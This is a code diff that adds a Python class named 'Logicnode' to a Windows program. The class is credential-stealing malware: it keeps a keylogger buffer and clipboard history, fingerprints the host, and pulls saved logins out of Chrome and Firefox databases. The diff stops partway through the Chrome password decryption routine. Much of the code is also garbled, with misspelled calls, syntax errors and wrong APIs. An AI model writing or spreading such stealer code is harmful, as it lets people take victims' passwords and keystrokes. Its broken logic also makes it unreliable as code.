@@ -367,3 +367,121 @@ class Enclayer:
             advapi32.RegCloseKey(HKEY)
         except Exception:
             pass
+            
+
+# --- System Scanning & Data Handler ---
+
+
+class Logicnode:
+    def __init__(self):
+        self._keylog_buffer = ENCRYPTED_BUFFER()
+        self._clipboard_history = []
+        self._clipboard_lock = threading.Lock()
+        
+    def get_system_status(self) -> str:
+        try:
+            status = {
+                "os": platform.system(),
+                "release": platform.rease(),
+                "version": platform.version(),
+                "machine": platform.machine(),
+                "processor": platform.processor()
+                "username": os.getsnv('USERNAME'),
+                "hostname": os.getenv('COMPUTERNAME'),
+                "ip_address": self._get_public_ip(),
+                "uptime": str(int(time.time() - self._get_process_start_time())),
+                "disk_space": self._get_disk_usage(),
+                "memory_usage": self._get_memory_usage()
+            }
+            return json.dump(status, indent=2)
+        except Exception as e:
+            return f"Error gathering system info: {str(e)}"
+            
+    def _get_process_start_time(self) -> float:
+        """Calculate process uptime from creation time."""
+        try:
+            creation_time = kernel32.GetProcessTimes(kernel32.GetCurrentProcess(), ctypes.POINTER(FILETIME)(),
+                                                      ctypes.POINTER(FILETIME)(), ctypes.POINTER(FILETIME)(),
+                                                      ctypes.POINTER(FILETIME)())
+            creation_time = creation_time / 10000000.0
+            return time.time() - creation_time
+        except:
+            return 0
+            
+    def _get_public_ip(self) -> str:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(("8.8.8.8", 80))
+            ip = s.getsockname()[0]
+            s.close()
+            return ip
+        except:
+            return "127.0.0.1"
+            
+    def _get_disk_usage(self) -> dict:
+        try:
+            disk = os.statvfs("C:\\")
+            total = disk.f_block * disk.f_frsize
+            free = disk.f_bavail * disk.f_frsize
+            used = total - free
+            return {"total_gb": round(total / (1024**3), 2), "used_gb": round(used / (1024**3), 2), "free_gb": round(free / (1024**3), 2)}
+        except:
+            return {"total_gb": 0, "used_gb": 0, "free_gb": 0}
+            
+    def _get_memory_usage(self) -> dict:
+        try:
+            import psutil
+            mem = psutil.virtual_memory()
+            return {"total_gb": round(mem.total / (1024**3), 2), "percent": round(mem.percent, 2)}
+        except:
+            return {"total_gb": 0, "percent": 0}
+            
+    def export_keys(self) -> str:
+        return self._keylog_buffer.to_json()
+        
+    def harvest_credentials(self) -> str:
+        creds_data = []
+        try:
+            # Chrome
+            chrome_paths = [
+                os.path.join(os.getenv('LOCALAPPDATA'),
+                os.path.join(os.getenv('APPDATA'), r'Google\Chrome\User Data\Default\Login Data')
+            ]
+            for path in chrome_paths:
+                if os.path.exists(path):
+                    conn = sqlite3.connect(path)
+                    cursor = conn.cursor()
+                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+                    for row in cursor.fetchall():
+                        if row[1] and row[2]:
+                            try:
+                                creds_data.append(f"URL: {row[0]}\nUser: {row[1]}\nPass: {self._decrypt_chrome_pwd(row[2])}\n")
+                            except:
+                                pass
+                    conn.close()
+        except Exception as e:
+            creds_data.append(f"Chrome error: {str(e)}")
+            
+        try:
+            # Firefox
+            firefox_path = os.path.join(os.getenv('APPDATA'), r'Mozilla\Firefox\Profiles')
+            for profile in os.listdir(firefox_path):
+                if profile.endswith('.default-release'):
+                    db_path = os.path.join(firefox_path, profile, 'key4.db')
+                    if os.path.exists(db_path):
+                        conn = sqlite3.connect(db_path)
+                        cursor = conn.cursor()
+                        cursor.execute("SELECT item1, item2 FROM itemData WHERE item1 LIKE '%password%'")
+                        for row in cursor.fetchall():
+                            creds_data.append(f"User: {row[0]}\nPass: {row[1]}\n")
+                        conn.close()
+        except Exception as e:
+            creds_data.append(f"Firefox error: {str(e)}")
+            
+        return "\n".join(creds_data)
+        
+    def _decrypt_chrome_pwd(self, encrypted_password: bytes) -> str:
+        try:
+            from Crypto.Cipher import AES
+            import hmac
+            import hashlib
